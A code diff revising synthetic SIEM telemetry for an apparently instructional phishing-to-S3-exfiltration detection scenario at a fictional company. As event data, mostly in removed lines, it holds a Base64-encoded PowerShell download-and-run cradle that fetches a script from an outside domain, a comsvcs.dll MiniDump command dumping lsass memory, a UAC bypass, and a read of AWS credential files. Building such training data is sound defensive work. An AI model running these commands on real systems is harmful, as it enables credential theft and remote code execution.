@@ -19,7 +19,9 @@ export function phishingToExfilEvents() {
   const victim   = { hostname: "WS-FIN-2847", email: "j.smith@nexacorp.com",   ip: "10.10.20.14" };
   const c2Domain = "cdn-update-fb76.xyz";
   const c2Ip     = "185.134.140.139";
-  const attackerIp = "91.108.56.122";
+  // Story-specific infrastructure (not shared with bec / oauth).
+  const attackerIp = "193.42.33.71";
+  const senderIp   = "141.98.11.54";
   const dllHash  = makeSha256("svchost32_lockbit_loader");
 
   const events: TelemetryEvent[] = [
@@ -80,9 +82,9 @@ export function phishingToExfilEvents() {
     {
       id: "evt_02_phish_email", ts: T(5 * MIN),
       source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
-      user_email: victim.email, src_ip: "91.108.56.199",
+      user_email: victim.email, src_ip: senderIp,
       severity: "high", mitre_technique: "T1566.001",
-      description: "j.smith received an email with a macro-enabled Word attachment (Invoice_Q3_Final.docm) from a domain registered 6 days ago. SPF, DKIM, and DMARC all failed.",
+      description: "j.smith received an email with a macro-enabled Word attachment (Invoice_Q3_Final.docm) from nexacorp-vendor.xyz. SPF, DKIM, and DMARC all failed; a transport rule allowed delivery.",
       raw: {
         "event.action": "EmailDelivered", "event.outcome": "success",
         "email.from.address": "support@nexacorp-vendor.xyz",
@@ -91,11 +93,12 @@ export function phishingToExfilEvents() {
         "email.attachment.name": "Invoice_Q3_Final.docm",
         "email.direction": "inbound",
         "file.size": "47293",
-        "source.ip": "91.108.56.199",
+        "source.ip": senderIp,
         "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
+        // Delivered clean: an allow-rule override delivers without a malware
+        // verdict (MDO never shows Malware + Delivered on one row).
         "action_result": "delivered",
-        "block.reason": "Transport rule whitelist — keyword match: invoice",
-        "threat.category": "Phishing",
+        "delivery.override": "Transport rule allow — keyword match: invoice",
       },
     },
     {
@@ -132,10 +135,10 @@ export function phishingToExfilEvents() {
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "critical", mitre_technique: "T1059.001",
-      description: "WINWORD.EXE on WS-FIN-2847 spawned a hidden, Base64-encoded PowerShell process moments after the macro ran.",
+      description: "WINWORD.EXE on WS-FIN-2847 spawned a hidden PowerShell process with execution policy bypass, running a script from jsmith's Temp folder.",
       process: {
         name: "powershell.exe", pid: 5512, parent_name: "WINWORD.EXE", parent_pid: 4128,
-        cmdline: "powershell.exe -ep bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBtAHMAdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AYwBvAG0ALwBzAC4AcABzADEAJwApAA==",
+        cmdline: "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\jsmith\\AppData\\Local\\Temp\\inv_q3.ps1",
         user: "NEXACORP\\jsmith", integrity: "medium",
       },
       raw: {
@@ -166,7 +169,7 @@ export function phishingToExfilEvents() {
         "process.pid": "5512",
         "process.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "process.name": "powershell.exe",
-        "process.command_line": "powershell.exe -ep bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBtAHMAdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AYwBvAG0ALwBzAC4AcABzADEAJwApAA==",
+        "process.command_line": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\jsmith\\AppData\\Local\\Temp\\inv_q3.ps1",
         "process.hash.sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1848474f30",
         "process.hash.md5": "7353f60b1739074eb17c5f4dddefe239",
         "process.integrity_level": "MEDIUM_INTEGRITY_LEVEL",
@@ -195,6 +198,38 @@ export function phishingToExfilEvents() {
         // Threat mapping
       },
     },
+    // ── First alert: the EDR detection on the Office → PowerShell parent/child pair ──
+    {
+      id: "evt_phish_edr_alert", ts: T(5 * MIN + 33_000),
+      source: "edr", vendor: "CrowdStrike Falcon", event_type: "edr_alert",
+      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
+      severity: "high", mitre_technique: "T1059.001", is_detection: true,
+      process: {
+        name: "powershell.exe", pid: 5512, parent_name: "WINWORD.EXE", parent_pid: 4128,
+        cmdline: "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\jsmith\\AppData\\Local\\Temp\\inv_q3.ps1",
+        user: "NEXACORP\\jsmith", integrity: "medium",
+      },
+      description: "Falcon raised a High detection on WS-FIN-2847: WINWORD.EXE launched a hidden powershell.exe with execution policy bypass. Disposition: detection only, process not stopped.",
+      raw: {
+        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
+        "crowdstrike.detection.name": "OfficeAppSpawnsScriptInterpreter",
+        "crowdstrike.detection.description": "A Microsoft Office application launched PowerShell with a hidden window and execution policy bypass.",
+        "crowdstrike.detection.severity": "High",
+        "crowdstrike.detection.tactic": "Execution",
+        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
+        "crowdstrike.detection.technique_id": "T1059.001",
+        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
+        "crowdstrike.detection.process_tree": "explorer.exe > WINWORD.EXE > powershell.exe",
+        "crowdstrike.sensor.id": "97f45e3afc637a1614ec711f50bb1286",
+        "crowdstrike.network_containment_state": "Not Contained",
+        "event.action": "alert",
+        "process.pid": "5512",
+        "process.parent.pid": "4128",
+        "user.name": "NEXACORP\\jsmith",
+        "host.name": "WS-FIN-2847",
+        "host.ip": "10.10.20.14",
+      },
+    },
     // ── CORRELATED: DNS query for C2 domain just before beacon ────────────────────
     {
       id: "evt_phish_dns_c2", ts: T(5 * MIN + 42_000),
@@ -216,6 +251,19 @@ export function phishingToExfilEvents() {
         "winlog.event_data.Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "host.name": victim.hostname,
       },
+    },
+
+    // ── CORRELATED: the internal resolver's own record of the same lookup ─────────
+    {
+      id: "evt_phish_dns_server", ts: T(5 * MIN + 42_000),
+      source: "dns", vendor: "Windows DNS Server",
+      event_type: "dns_query", severity: "medium",
+      hostname: victim.hostname, src_ip: victim.ip,
+      dns: { query: c2Domain, query_type: "A", rcode: "NOERROR" },
+      description: `The internal DNS server answered ${victim.hostname}'s A query for ${c2Domain} with ${c2Ip}.`,
+      raw: { "dns.question.name": c2Domain, "dns.question.type": "A",
+             "dns.response_code": "NOERROR", "dns.resolved_ip": c2Ip,
+             "source.ip": victim.ip },
     },
 
     // ── CORRELATED: Firewall event — PowerShell connecting to C2 IP ───────────────
@@ -297,7 +345,7 @@ export function phishingToExfilEvents() {
         "process.name": "powershell.exe",
         "process.pid": "5512",
         "process.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "process.command_line": "powershell.exe -ep bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBtAHMAdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AYwBvAG0ALwBzAC4AcABzADEAJwApAA==",
+        "process.command_line": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\jsmith\\AppData\\Local\\Temp\\inv_q3.ps1",
         "process.hash.sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1848474f30",
         // User
         "user.name": "NEXACORP\\jsmith",
@@ -333,334 +381,26 @@ export function phishingToExfilEvents() {
         "winlog.event_data.User": "NEXACORP\\jsmith",
       },
     },
-    {
-      id: "evt_08_dns_tunnel", ts: T(17 * MIN),
-      source: "dns", vendor: "Infoblox DNS", event_type: "dns_query",
-      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
-      severity: "high", mitre_technique: "T1071.004",
-      network: { domain: c2Domain },
-      description: `WS-FIN-2847 sent a DNS TXT query for a long random subdomain of ${c2Domain} and received a Base64-encoded answer.`,
-      raw: {
-        "event.action": "dns_query",
-        "infoblox.query_name": "dh7k2nq3x1vc9ab4fzrp.cdn-update-fb76.xyz",
-        "infoblox.query_type": "TXT",
-        "infoblox.response_code": "NOERROR",
-        "infoblox.rpz_policy": "PASSTHRU",
-        "infoblox.answer": "cmVjdiA0NzUgYnl0ZXMgZGF0YQ==",
-        "dns.question.name": "dh7k2nq3x1vc9ab4fzrp.cdn-update-fb76.xyz",
-        "dns.question.type": "TXT",
-        "dns.response_code": "NOERROR",
-        "source.ip": "10.10.20.14", "host.name": "WS-FIN-2847",
-        "network.protocol": "dns",
-      },
-    },
-    // Privilege escalation. The dump below opens lsass.exe with PROCESS_ALL_ACCESS,
-    // which needs SeDebugPrivilege — a medium-integrity token does not have it.
-    // The beacon has to elevate first, and doing so leaves its own trail.
-    {
-      id: "evt_08b_uac_bypass", ts: T(22 * MIN),
-      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
-      hostname: victim.hostname, user_email: victim.email,
-      severity: "high", mitre_technique: "T1548.002",
-      process: {
-        name: "computerdefaults.exe", pid: 5980, parent_name: "powershell.exe", parent_pid: 5512,
-        cmdline: "computerdefaults.exe",
-        user: "NEXACORP\\jsmith", integrity: "high",
-      },
-      description: "computerdefaults.exe started at High integrity with the beacon's PowerShell process as its parent, and no consent prompt was recorded.",
-      raw: {
-        "event.code": "1",
-        "winlog.provider_name": "Microsoft-Windows-Sysmon",
-        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
-        "winlog.event_data.ProcessId": "5980",
-        "winlog.event_data.Image": "C:\\Windows\\System32\\computerdefaults.exe",
-        "winlog.event_data.CommandLine": "computerdefaults.exe",
-        "winlog.event_data.ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "winlog.event_data.ParentProcessId": "5512",
-        "winlog.event_data.User": "NEXACORP\\jsmith",
-        "winlog.event_data.IntegrityLevel": "High",
-        "winlog.event_data.Company": "Microsoft Corporation",
-      },
-    },
-    {
-      id: "evt_09_lsass", ts: T(23 * MIN),
-      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
-      hostname: victim.hostname, user_email: victim.email,
-      severity: "critical", mitre_technique: "T1003.001",
-      process: {
-        name: "rundll32.exe", pid: 6244, parent_name: "computerdefaults.exe", parent_pid: 5980,
-        cmdline: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 704 C:\\Users\\jsmith\\AppData\\Local\\Temp\\debug.bin full",
-        user: "NEXACORP\\jsmith", integrity: "high",
-      },
-      file: { path: "C:\\Users\\jsmith\\AppData\\Local\\Temp\\debug.bin" },
-      description: "CrowdStrike detected rundll32.exe on WS-FIN-2847 using comsvcs.dll MiniDump to write lsass.exe memory to debug.bin.",
-      raw: {
-        // CrowdStrike Falcon — detection metadata
-        "crowdstrike.event_simpleName": "CredentialDumpingTool",
-        "crowdstrike.detection.id": "ldt:bf21870142a4e34a535af46f5b8bcfd7:1234567893",
-        "crowdstrike.detection.description": "rundll32.exe invoked comsvcs.dll MiniDump to dump LSASS memory (PID 704) to C:\\Users\\jsmith\\AppData\\Local\\Temp\\debug.bin. PROCESS_ALL_ACCESS (0x1FFFFF) was requested against lsass.exe. NTLM hashes and Kerberos tickets at risk.",
-        "crowdstrike.detection.scenario": "lsass_memory_dump_via_comsvcs",
-        "crowdstrike.detection.tactic": "Credential Access",
-        "crowdstrike.detection.tactic_id": "TA0006",
-        "crowdstrike.detection.technique": "OS Credential Dumping: LSASS Memory",
-        "crowdstrike.detection.technique_id": "T1003.001",
-        "crowdstrike.detection.pattern_id": "30732",
-        "crowdstrike.detection.pattern_disposition": "10",
-        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
-        "crowdstrike.detection.objective": "Gather Credentials",
-        "crowdstrike.detection.severity": "Critical",
-        "crowdstrike.sensor.id": "97f45e3afc637a1614ec711f50bb1286",
-        "crowdstrike.customer_id": "a214f4f4fa1ab768a188dd17a1c89e85",
-        "crowdstrike.sensor.version": "7.08.17410.0",
-        "crowdstrike.network_containment_state": "Not Contained",
-        "crowdstrike.tree_id": "57fe9cc432b4a165e5acbc776956a726",
-        "crowdstrike.CallStackModuleNames": "ntdll.dll|KERNELBASE.dll|kernel32.dll|comsvcs.dll|rundll32.exe",
-        "crowdstrike.detection.link": "https://falcon.crowdstrike.com/activity/detections/detail/bf21870142a4e34a535af46f5b8bcfd7/1234567893",
-        // Event
-        "event.action": "process_created",
-        "event.created": "2026-05-08T10:05:00.000Z",
-        // Process — rundll32.exe (the credential dumper)
-        "process.pid": "6244",
-        "process.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\rundll32.exe",
-        "process.name": "rundll32.exe",
-        "process.command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 704 C:\\Users\\jsmith\\AppData\\Local\\Temp\\debug.bin full",
-        "process.hash.sha256": "9fe0e4ff5da38985888ef487f4901bbdac109e9fb8323b8c9655a1271211166f",
-        "process.hash.md5": "3d87df5ec4b33f7f41e53a14b5d4c3e2",
-        "process.integrity_level": "HIGH_INTEGRITY_LEVEL",
-        "process.token_type": "TokenPrimary",
-        "process.session_id": "1",
-        // Parent — powershell.exe
-        // Must match the structured block: the dump runs from the ELEVATED
-        // computerdefaults.exe, which is the whole point of evt_08b. The raw
-        // block previously named powershell.exe here, so anyone reading the raw
-        // saw the LSASS open happening at medium integrity — the opposite of
-        // the lesson.
-        "process.parent.pid": "5980",
-        "process.parent.name": "computerdefaults.exe",
-        "process.parent.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\computerdefaults.exe",
-        "process.parent.command_line": "computerdefaults.exe",
-        "process.parent.integrity_level": "High",
-        // Grandparent is now powershell.exe — the medium-integrity beacon that
-        // launched the bypass. WINWORD.EXE moves one step further out.
-        "process.grandparent.name": "powershell.exe",
-        "process.grandparent.pid": "5512",
-        "process.grandparent.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "process.grandparent.integrity_level": "Medium",
-        // Target process — lsass.exe (the victim of the memory dump)
-        "process.target.name": "lsass.exe",
-        "process.target.pid": "704",
-        "process.target.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe",
-        "process.target.access_rights": "0x1FFFFF",
-        // LOLBAS — comsvcs.dll
-        "lolbas.name": "comsvcs.dll",
-        "lolbas.function": "MiniDump",
-        "lolbas.signed": "true",
-        "lolbas.vendor": "Microsoft Corporation",
-        "lolbas.description": "Windows COM+ Services DLL — MiniDump export abused to dump LSASS without external tools",
-        // Output file (the credential dump)
-        "file.name": "debug.bin",
-        "file.path": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\debug.bin",
-        "file.size": "58720256",
-        "file.created": "2026-05-08T10:05:01.231Z",
-        "file.type": "memory_dump",
-        // User
-        "user.name": "NEXACORP\\jsmith",
-        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1103",
-        // Host
-        "host.name": "WS-FIN-2847",
-        "host.ip": "10.10.20.14",
-        "host.mac": "00-0C-29-AB-CD-EF",
-        "host.os.name": "Windows 10 Pro",
-        "host.os.version": "22H2",
-        "host.os.build": "19045.4291",
-        // Threat mapping
-      },
-    },
-    {
-      id: "evt_09b_kerberos_tgt", ts: T(24 * MIN),
-      source: "ad", vendor: "Windows Security", event_type: "kerberos_tgt",
-      hostname: "DC01", user_email: victim.email,
-      // T1550.002 Pass the Hash. A 4768 requesting a TGT with RC4 immediately
-      // after an LSASS dump is the overpass-the-hash signature: the attacker
-      // holds the NTLM hash, not the password, so pre-authentication is built
-      // with the RC4 key derived from that hash. It was mapped T1558.003
-      // (Kerberoasting), which is a 4769 TGS request against an SPN account
-      // cracked offline — a different event id, a different direction, and it
-      // requires a valid account to begin with.
-      severity: "high", mitre_technique: "T1550.002",
-      description: `A Kerberos TGT for jsmith was requested from WS-FIN-2847 using RC4 encryption (0x17).`,
-      raw: {
-        "event.code": "4768",
-        "winlog.channel": "Security",
-        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
-        "winlog.event_data.TargetUserName": victim.email.split("@")[0],
-        "winlog.event_data.TargetDomainName": "NEXACORP",
-        "winlog.event_data.TargetSid": "S-1-5-21-3421479547-3897544621-1789562108-1103",
-        "winlog.event_data.ServiceName": "krbtgt",
-        "winlog.event_data.ServiceSid": "S-1-5-21-3421479547-3897544621-1789562108-502",
-        "winlog.event_data.TicketOptions": "0x40810010",
-        "winlog.event_data.TicketEncryptionType": "0x17",
-        "winlog.event_data.IpAddress": victim.ip ?? "10.0.1.52",
-        "winlog.event_data.IpPort": "54802",
-        "winlog.event_data.Status": "0x0",
-        "winlog.event_data.PreAuthType": "2",
-      },
-    },
-    {
-      id: "evt_05_smb_lateral", ts: T(24 * MIN + 30_000),
-      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
-      hostname: victim.hostname, user_email: victim.email,
-      src_ip: victim.ip, dst_ip: "10.10.1.20", dst_port: 445, protocol: "tcp",
-      severity: "high", mitre_technique: "T1021.002",
-      network: { bytes_out: 84992, bytes_in: 12288 },
-      description: `WS-FIN-2847 opened an SMB session to internal file server 10.10.1.20 on port 445, allowed by rule ALLOW-INTERNAL.`,
-      raw: {
-        "event.action": "network-connection-allowed", "event.outcome": "success",
-        "source.ip": victim.ip, "source.port": "49851",
-        "destination.ip": "10.10.1.20", "destination.port": "445",
-        "network.protocol": "tcp", "network.transport": "tcp",
-        "network.application": "msrpc-base",
-        "pan.app": "msrpc-base",
-        "pan.action": "allow",
-        "pan.rule": "ALLOW-INTERNAL",
-        "network.bytes_out": "84992", "network.bytes_in": "12288",
-        "action_result": "allow",
-      },
-    },
-    {
-      id: "evt_09c_network_logon", ts: T(25 * MIN),
-      source: "ad", vendor: "Windows Security", event_type: "auth_success",
-      hostname: "FS-CORP-01", user_email: victim.email,
-      severity: "high", mitre_technique: "T1078",
-      description: "jsmith authenticated to FS-CORP-01 via a Kerberos network logon (Type 3) sourced from WS-FIN-2847.",
-      raw: {
-        "event.code": "4624",
-        "winlog.channel": "Security",
-        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
-        "winlog.event_data.LogonType": "3",
-        "winlog.event_data.TargetUserName": victim.email.split("@")[0],
-        "winlog.event_data.TargetDomainName": "NEXACORP",
-        "winlog.event_data.LogonProcessName": "Kerberos",
-        "winlog.event_data.AuthenticationPackageName": "Kerberos",
-        "winlog.event_data.WorkstationName": victim.hostname,
-        "winlog.event_data.IpAddress": victim.ip ?? "10.0.1.52",
-        "winlog.event_data.IpPort": "54803",
-        "winlog.event_data.SubjectUserName": "-",
-        "winlog.event_data.SubjectDomainName": "-",
-        "winlog.event_data.KeyLength": "0",
-      },
-    },
-    {
-      id: "evt_10_foreign_auth", ts: T(35 * MIN),
-      source: "o365", vendor: "Microsoft Entra ID", event_type: "auth_success",
-      user_email: victim.email, src_ip: attackerIp,
-      severity: "critical", mitre_technique: "T1078",
-      description: `j.smith's Microsoft 365 account signed in from Amsterdam, Netherlands (${attackerIp}); Entra ID Identity Protection rated the sign-in High Risk.`,
-      raw: {
-        // Azure AD / Entra ID Sign-In Log
-        "azure.signinlogs.correlation_id": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
-        "azure.signinlogs.resultType": "0",
-        "azure.signinlogs.result_description": "Successfully signed in",
-        "azure.signinlogs.app_id": "00000002-0000-0ff1-ce00-000000000000",
-        "azure.signinlogs.app_display_name": "Office 365 Exchange Online",
-        "azure.signinlogs.resource_display_name": "Microsoft 365",
-        "azure.signinlogs.client_app_used": "Browser",
-        "azure.signinlogs.authentication_requirement": "singleFactorAuthentication",
-        "azure.signinlogs.conditional_access_status": "notApplied",
-        // Was "userPassedMFADrivenByRiskBasedPolicy", which contradicts
-        // conditional_access_status notApplied in the same record.
-        "azure.signinlogs.risk_detail": "none",
-        "azure.signinlogs.risk_level_aggregated": "high",
-        "azure.signinlogs.risk_level_during_signin": "high",
-        "azure.signinlogs.risk_state": "atRisk",
-        "azure.signinlogs.is_interactive": "true",
-        "azure.signinlogs.tenant_id": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
-        "azure.signinlogs.user_id": "a1b2c3d4-e5f6-a1b2-c3d4-e5f6a1b2c3d4",
-        "azure.signinlogs.user_principal_name": "j.smith@nexacorp.com",
-        "azure.signinlogs.user_display_name": "James Smith",
-        "azure.signinlogs.user_type": "Member",
-        "azure.signinlogs.device_detail.browser": "python-requests/2.28.0",
-        "azure.signinlogs.device_detail.operating_system": "Linux",
-        "azure.signinlogs.device_detail.device_id": "(not registered)",
-        "azure.signinlogs.device_detail.is_compliant": "false",
-        "azure.signinlogs.device_detail.is_managed": "false",
-        "azure.signinlogs.location.city": "Amsterdam",
-        "azure.signinlogs.location.country_or_region": "NL",
-        "azure.signinlogs.location.geo_coordinates.latitude": "52.3702",
-        "azure.signinlogs.location.geo_coordinates.longitude": "4.8952",
-        // ECS fields
-        "event.action": "UserLoggedIn",
-        "event.outcome": "success",
-        "event.created": "2026-05-08T10:17:00.000Z",
-        "user.email": "j.smith@nexacorp.com",
-        "source.ip": "91.108.56.122",
-        "source.geo.country_name": "Netherlands",
-        "source.geo.city_name": "Amsterdam",
-        "user_agent.original": "python-requests/2.28.0",
-        "authentication.status": "success",
-        "authentication.method": "Password",
-        "risk.level": "High",
-      },
-    },
-    {
-      id: "evt_11_inbox_rule", ts: T(38 * MIN),
-      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "account_modify",
-      user_email: victim.email, src_ip: attackerIp,
-      severity: "high", mitre_technique: "T1564.008",
-      description: `A new inbox rule was created in j.smith's mailbox from ${attackerIp}: any email containing wire, invoice, or payment is moved to RSS Feeds and marked as read.`,
-      raw: {
-        // O365 Unified Audit Log — New-InboxRule
-        "data.office365.Id": "a1b2c3d4-e5f6-7a8b-9c0d-e1f2a3b4c5d6",
-        "data.office365.RecordType": "1",
-        "data.office365.CreationTime": "2026-05-08T10:20:00Z",
-        "data.office365.Operation": "New-InboxRule",
-        "data.office365.OrganizationId": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
-        "data.office365.Workload": "Exchange",
-        "data.office365.UserId": "j.smith@nexacorp.com",
-        "data.office365.UserKey": "a1b2c3d4-e5f6-a1b2-c3d4-e5f6a1b2c3d4",
-        "data.office365.UserType": "0",
-        "data.office365.ResultStatus": "True",
-        "data.office365.ClientIP": attackerIp,
-        "data.office365.SessionId": "b2c3d4e5-f6a1-b2c3-d4e5-f6a1b2c3d4e5",
-        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy;ProxyUpstreamProtocol=EWS",
-        "data.office365.ExternalAccess": "false",
-        // New-InboxRule cmdlet parameters, as O365 UAL actually records them
-        "data.office365.Parameters[0].Name": "Name",
-        "data.office365.Parameters[0].Value": "․․",
-        "data.office365.Parameters[1].Name": "SubjectOrBodyContainsWords",
-        "data.office365.Parameters[1].Value": "[\"wire\",\"invoice\",\"payment\",\"banking\"]",
-        "data.office365.Parameters[2].Name": "MoveToFolder",
-        "data.office365.Parameters[2].Value": "RSS Feeds",
-        "data.office365.Parameters[3].Name": "MarkAsRead",
-        "data.office365.Parameters[3].Value": "True",
-        "data.office365.Parameters[4].Name": "StopProcessingRules",
-        "data.office365.Parameters[4].Value": "False",
-      },
-    },
-    // ── The credential the S3 exfiltration actually runs on ─────────────────
-    //
-    // ADDED. The scenario jumped straight from an LSASS dump to a 184 MB S3
-    // download attributed to j.smith, with nothing in between. An LSASS dump
-    // yields NTLM hashes and Kerberos tickets — it does NOT yield AWS access
-    // keys. No event read ~/.aws/credentials, called Secrets Manager, or
-    // touched a browser credential store, so the causal prerequisite for the
-    // entire final act was missing and a student tracing the chain would hit a
-    // wall they could not resolve.
-    //
-    // Two events close it: the beacon reading the profile off disk, then the
-    // key being exercised. GetCallerIdentity is also what a real operator runs
-    // first — it is how you find out whose key you just stole.
+    // ── One goal: the AWS key on this workstation → the S3 export bucket ────
+    // (2026-10-02 review: the LSASS dump, RC4 TGT, SMB hop, Entra sign-in and
+    // inbox rule were three unconnected goals; they were cut so every row below
+    // leads to the S3 download.) The same PowerShell process (PID 5512) that
+    // resolved the new domain reads the CLI profile; the key it holds is then
+    // used from outside, and the access key id threads 11c → 12.
     {
       id: "evt_11b_aws_profile_read", ts: T(38 * MIN),
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_access",
       hostname: victim.hostname, user_email: victim.email,
       severity: "high", mitre_technique: "T1552.001",
-      description: `The beacon on ${victim.hostname} read C:\\Users\\jsmith\\.aws\\credentials.`,
+      process: { name: "powershell.exe", pid: 5512, parent_name: "WINWORD.EXE", parent_pid: 4128, user: "NEXACORP\\jsmith", integrity: "medium" },
+      file: { path: "C:\\Users\\jsmith\\.aws\\credentials", size: 217 },
+      description: `powershell.exe (PID 5512) on ${victim.hostname} opened C:\\Users\\jsmith\\.aws\\credentials.`,
       raw: {
         "crowdstrike.event_simpleName": "FileOpenInfo",
         "crowdstrike.FileName": "credentials",
         "crowdstrike.FilePath": "C:\\Users\\jsmith\\.aws\\",
-        "crowdstrike.process_name": "rundll32.exe",
+        "crowdstrike.process_name": "powershell.exe",
+        "crowdstrike.RawProcessId": "5512",
         "crowdstrike.UserName": "NEXACORP\\jsmith",
         "file.path": "C:\\Users\\jsmith\\.aws\\credentials",
         "file.size": 217,
@@ -668,41 +408,18 @@ export function phishingToExfilEvents() {
         "event.outcome": "success",
       },
     },
-    // ── CORRELATED: Outcome — account locked after Netherlands login flagged ──────
-    {
-      id: "evt_phish_outcome_lock", ts: T(38 * MIN),
-      source: "o365", vendor: "Microsoft Entra ID",
-      event_type: "account_modify", severity: "medium",
-      user_email: victim.email, src_ip: "10.10.1.5",
-      description: "Entra ID Identity Protection raised j.smith's account risk level to High.",
-      raw: {
-        "data.office365.Operation": "Set user risk level",
-        "data.office365.Workload": "AzureActiveDirectory",
-        "data.office365.UserId": "it-security@nexacorp.com",
-        "data.office365.ObjectId": victim.email,
-        "data.office365.ResultStatus": "Success",
-        "azure.auditlogs.category": "UserManagement",
-        "azure.auditlogs.target_user.upn": victim.email,
-        "user.risk_level": "High",
-        "user.risk_state": "atRisk",
-        "security.action": "RiskDetected_FirstTimeCountry",
-        "event.action": "SetUserRiskLevel",
-        "event.outcome": "success",
-        "source.ip": "10.10.1.5",
-      },
-    },
     {
       id: "evt_11c_sts_identity", ts: T(40 * MIN),
       source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
       user_email: victim.email, src_ip: attackerIp,
       severity: "high", mitre_technique: "T1078.004",
-      description: `GetCallerIdentity was called with access key AKIA4XJ9PQ2M7RVTLB3D from ${attackerIp}.`,
+      description: `GetCallerIdentity was called with access key AKIA4XJ9PQ2M7EXAMPLE from ${attackerIp}.`,
       raw: {
         "aws.cloudtrail.eventName": "GetCallerIdentity",
         "aws.cloudtrail.eventSource": "sts.amazonaws.com",
         "aws.cloudtrail.userIdentity.type": "IAMUser",
         "aws.cloudtrail.userIdentity.userName": "jsmith-analytics",
-        "aws.cloudtrail.userIdentity.accessKeyId": "AKIA4XJ9PQ2M7RVTLB3D",
+        "aws.cloudtrail.userIdentity.accessKeyId": "AKIA4XJ9PQ2M7EXAMPLE",
         "aws.cloudtrail.sourceIPAddress": attackerIp,
         "aws.cloudtrail.userAgent": "aws-cli/2.13.25 Python/3.11.6 Windows/10",
         "aws.cloudtrail.awsRegion": "eu-west-1",
@@ -713,11 +430,17 @@ export function phishingToExfilEvents() {
       id: "evt_12_s3_exfil", ts: T(43 * MIN),
       source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
       user_email: victim.email, src_ip: attackerIp,
-      severity: "critical", mitre_technique: "T1567.002",
+      // T1530 Data from Cloud Storage: a GetObject against the victim's own
+      // bucket (T1567.002 is an upload TO an attacker's cloud storage).
+      severity: "critical", mitre_technique: "T1530",
       network: { bytes_out: 184_000_000 },
-      description: `j.smith's AWS credentials downloaded a 184MB customer financial archive from S3 from ${attackerIp} (Netherlands).`,
+      description: `Access key AKIA4XJ9PQ2M7EXAMPLE (jsmith-analytics) read exports/customer-financial-data-2026.zip (184 MB) from bucket nexacorp-crm-exports, from ${attackerIp}.`,
       raw: {
         "event.action": "GetObject", "event.outcome": "success",
+        "aws.cloudtrail.requestParameters.bucketName": "nexacorp-crm-exports",
+        "aws.cloudtrail.requestParameters.key": "exports/customer-financial-data-2026.zip",
+        "aws.cloudtrail.sourceIPAddress": attackerIp,
+        "aws.cloudtrail.awsRegion": "eu-west-1",
         // Field names aligned to eventName/eventSource, matching the two
         // CloudTrail events that now precede this one — the same scenario was
         // using snake_case here and camelCase there.
@@ -728,7 +451,7 @@ export function phishingToExfilEvents() {
         // but never establish WHICH credential performed it.
         "aws.cloudtrail.userIdentity.type": "IAMUser",
